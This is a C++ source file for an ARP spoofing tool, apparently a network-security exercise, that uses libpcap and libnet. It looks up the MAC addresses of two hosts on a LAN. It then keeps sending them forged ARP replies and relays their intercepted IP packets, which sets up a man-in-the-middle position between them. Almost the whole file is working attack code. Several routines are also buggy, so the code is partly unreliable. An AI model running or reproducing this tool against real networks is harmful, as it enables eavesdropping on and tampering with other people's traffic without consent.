#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <unistd.h>
#include <time.h>
#include <sys/ioctl.h>
#include <libnet.h>
#include <string.h>

#pragma pack(push, 1)

struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};

struct packet_hdr{
    struct libnet_ethernet_hdr ethhdr;
    struct libnet_ipv4_hdr iphdr;
    struct libnet_tcp_hdr tcphdr;
    uint8_t* data;
};

#pragma pack(pop)

void usage() {
	printf("syntax: arp-spoofing <interface> <sip> <dip>\n");
}

void my_ip(char* interface, char IP_str[20]){
struct ifreq ifr;
int fd;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) printf("Error");
	else inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, IP_str,sizeof(struct sockaddr));  
}

void my_mac(char* interface, char MAC_str[20]){
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<6; i++)
        sprintf(&MAC_str[i*3],"%02X:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
	sprintf(&MAC_str[i*3],"%02X",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    MAC_str[17]='\0';
}

void getyourmacaddress(char* dev, char* sip, char* smac, char* tip, char* tmac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(smac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(smac);
	packet.arp_.sip_ = htonl(Ip(sip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(tip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	struct pcap_pkthdr* pkthdr;
    	const u_char* packet1;
	while(1){
		int r = pcap_next_ex(handle, &pkthdr, &packet1);
		struct EthArpPacket *pkt = (struct EthArpPacket*) packet1;
		if(ntohs( pkt->eth_.type_ == htons(EthHdr::Arp))){
			char amac[20];
			strcpy(amac, std::string(pkt->eth_.dmac_).c_str());
			if(memcmp(smac, amac, sizeof(smac))==0) break;
		}
	}
	struct EthArpPacket *pkt = (struct EthArpPacket*) packet1;
	strcpy(tmac, std::string(pkt->arp_.smac_).c_str());
	for(int i=0; i<17; i++)
		if( 96 < tmac[i] && tmac[i] < 103 ) tmac[i] = tmac[i] - 32;
	pcap_close(handle);
}

void arp_replyorrequest(char* interface, char* srcip, char* srcmac, char* dstip, char* dstmac, int num){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return;
	}

	EthArpPacket packet;
	packet.eth_.dmac_ = Mac(dstmac);
	packet.eth_.smac_ = Mac(srcmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if(num == 0) packet.arp_.op_ = htons(ArpHdr::Reply);
	else if(num == 1) packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(srcmac);
	packet.arp_.sip_ = htonl(Ip(srcip));
	packet.arp_.tmac_ = Mac(dstmac);
	packet.arp_.tip_ = htonl(Ip(dstip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	pcap_close(handle);
}

void pkt_relay(char* dev, char* smac, char* amac, char* dmac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return;
	}
	while(true){
		struct pcap_pkthdr* header;
    		const u_char* pkt;
		int r = pcap_next_ex(handle, &header, &pkt);
		
		struct packet_hdr pkt_hdr;
    		memcpy(&(pkt_hdr.ethhdr), pkt, LIBNET_ETH_H);
    		memcpy(&(pkt_hdr.iphdr), pkt + LIBNET_ETH_H, LIBNET_IPV4_H);
    		memcpy(&(pkt_hdr.tcphdr), pkt + LIBNET_ETH_H+LIBNET_IPV4_H, LIBNET_TCP_H);
		memcpy(&(pkt_hdr.data), pkt + LIBNET_ETH_H + LIBNET_IPV4_H + 4 * pkt_hdr.tcphdr.th_off, header->caplen - (LIBNET_ETH_H + LIBNET_IPV4_H + 4 * pkt_hdr.tcphdr.th_off));

		uint8_t tpsmac[6], tptmac[6], tpamac[6];
		memcpy(tpsmac, pkt_hdr.ethhdr.ether_shost, sizeof(tpsmac));
		memcpy(tpamac, pkt_hdr.ethhdr.ether_dhost, sizeof(tpamac));
		char smac1[20], dmac1[20];
		
		int i;
		for(i=0; i<5; i++){
			sprintf(&smac1[i*3], "%02X:", tpsmac[i]);
			sprintf(&dmac1[i*3], "%02X:", tpamac[i]);
		}
		sprintf(&smac1[i*3], "%02X", tpsmac[i]);
		sprintf(&dmac1[i*3], "%02X", tpamac[i]);
		for(i=0;i<6;i++){
			if(64 < dmac[i*3]) tptmac[i] = (dmac[i*3] - 55) * 16;
			else tptmac[i] = (dmac[i*3] - 48) * 16;

			if(64 < dmac[i*3+1]) tptmac[i] += (dmac[i*3+1] - 55);
			else tptmac[i] += (dmac[i*3+1] - 48);
		}
		if(memcmp(dmac, dmac1, sizeof(amac))==0) break; // arp table ended
		
		if( memcmp(smac, smac1, sizeof(smac))==0 && memcmp(amac, dmac1, sizeof(amac))==0 && ntohs(pkt_hdr.ethhdr.ether_type) == ETHERTYPE_IP){
			memcpy(pkt_hdr.ethhdr.ether_shost, tpamac, sizeof(tpamac));
			memcpy(pkt_hdr.ethhdr.ether_dhost, tptmac, sizeof(tptmac));
			int res = pcap_sendpacket(handle, (const u_char*)(&pkt_hdr), sizeof(pkt_hdr));
			if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
			else puts("relay success!\n");
		}
	}
	pcap_close(handle);
}

char* aip = NULL;
char* amac = NULL;
char* sip;
char* smac = NULL;
char* tip;
char* tmac = NULL;

int main(int argc, char* argv[]) {
	if ( (argc%2) != 0 ) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char ipstr[20];
	char macstr[20];
	char macs[20];
	char macd1[20];
	char macd2[20];
	for(int i=2; i<argc; i += 2){
		for(int i=0;i<20;i++){
			macs[i]=macd1[i]=macd2[i]=0;
		}
		sip = argv[i];
		tip = argv[i+1];
	
		my_ip(dev, ipstr);  
    		my_mac(dev, macstr);
		aip = ipstr;
    		amac = macstr;

		strcpy(macs, amac);
		getyourmacaddress(dev, aip, macs, sip, macd1);//request
		smac = macd1;
		getyourmacaddress(dev, amac, macs, tip, macd2);//request
		tmac = macd2;

		printf("attacker ip address : %s attacker mac address : %s\n", aip, amac);
		if(smac!=NULL){
			printf("sender mac search successful!!\n");
			printf("sender ip address : %s sender mac address : %s\n", sip, smac);

		}
		else{
			printf("cannot search sender mac\n");
			printf("please check sender ip or sender pc working\n");
		}
		if(tmac!=NULL){
			printf("target mac search successful!!\n");
			printf("target ip address : %s target mac address : %s\n", tip, tmac);
		}
		else{
			printf("cannot search target mac\n");
			printf("please check target ip or target pc working\n");
		}
		int time = clock();
		int con;
		while (1){
			int time2 = clock();
			if((time2-time)<0.25){
				char errbuf[PCAP_ERRBUF_SIZE];
				pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
				if (handle == nullptr) {
					fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
					return 0;
				}
				
				struct pcap_pkthdr* header;
    				const u_char* pkt;
				int r = pcap_next_ex(handle, &header, &pkt);
				if(r==0||r==1||r==2){
					con = 1;
					continue;
				}
					
			}
			else if((time2-time)>=0.25){
				arp_replyorrequest(dev, tip, amac, sip, smac, 0);
				//sleep(0.25);
				pkt_relay(dev, smac, amac, tmac);
				time = clock();
			}
		}
	}
}
